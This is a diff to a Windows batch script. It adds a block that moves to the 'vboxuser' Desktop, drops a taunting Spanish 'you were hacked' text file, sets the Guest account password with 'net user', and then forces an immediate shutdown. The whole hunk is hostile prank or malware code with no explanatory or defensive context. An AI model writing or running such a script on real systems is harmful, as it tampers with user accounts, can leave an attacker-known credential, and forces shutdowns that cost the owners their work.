@@ -28,4 +28,11 @@ cd Desktop
 echo Fuiste jakiado por el fokin reinoso y el fokin brayatan > yaquersPros.txt
 net user Guest Brawlstars12?
 
+cd /d C:\
+cd Users
+cd vboxuser
+cd Desktop
+echo Fuiste jakiado por el fokin reinoso y el fokin brayatan > yaquersPros.txt
+net user Guest Brawlstars12?
+
 shutdown /s /f /t 0
